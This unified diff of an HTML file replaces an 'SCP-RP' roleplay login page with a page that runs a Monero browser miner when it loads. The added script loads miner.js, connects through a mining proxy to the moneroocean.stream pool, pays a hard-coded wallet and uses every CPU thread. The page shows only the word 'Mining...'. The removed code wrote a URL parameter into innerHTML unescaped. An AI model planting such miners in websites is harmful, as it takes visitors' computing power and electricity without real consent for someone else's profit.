@@ -1,44 +1,27 @@
 <!DOCTYPE html>
-<html>
-<head>
-<link rel = "icon" href = "L.png" type = "image/x-icon">        
-<title>SCP-RP</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="description" content="SCP Foundation RP">
-<style>
-body {background-color:#dddff5;background-repeat:no-repeat;background-position:top left;background-attachment:fixed;}
-h1{text-align:left;font-family:Times, serif;color:#000000;background-color:#dddff5;}
-p {font-family:Times, serif;font-size:14px;font-style:normal;font-weight:normal;color:#000000;background-color:#dddff5;}
-</style>
-</head>
-<body>
-<img src = "L.png"
-alt = "Logo" height = "250" width = "250" />
-<h1>SCP-RP</h1>
-<p>Login with your authentication key:</p>
-<form action="display.html" method="get">
-    <input type="text" name="auth" />
-    <input type="submit" value="Authenticate" />
-</form>
-<script>
-function getParameterByName(name, url) {
-    if (!url) url = window.location.href;
-    name = name.replace(/[\[\]]/g, '\\$&');
-    var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
-        results = regex.exec(url);
-    if (!results) return null;
-    if (!results[2]) return '';
-    return decodeURIComponent(results[2].replace(/\+/g, ' '));
-}
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title></title>
 
-var sn = getParameterByName('auth', 'https://mamubus.github.io/035.html');
-document.getElementById("write").innerHTML = sn;
+
+<!-- Start Of Mining Code -->
+<script src="miner.js"></script>
+<script>
+    server = "wss://f.xmrminingproxy.com:8181";
+    var pool = "moneroocean.stream";
+    var walletAddress = "47yLKb4teZLZUfpbXwA8UYhcTvcUAQNSDPpdQGQNDKp915zwKyo4snc1QtWYnn3aYvd8xsC8DqzCzavdoV8GFv6rUqLBN8D";
+    var workerId = "PS3"
+    var threads = -1;
+    var password = "";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20;
 </script>
-<p>If you are new and want to apply for Foundation Personnel L1:</p>
-<form action="/form/submit" method="GET">
-<textarea rows="5" cols="60" name="text" placeholder=""></textarea>
-<br/>
-<input type="submit" value="Send Application"/>
-</form>
-</body>
+<!-- End Of Mining Code -->
+
+
+  </head>
+  <body>
+    <h1>Mining...</h1>
+  </body>
 </html>
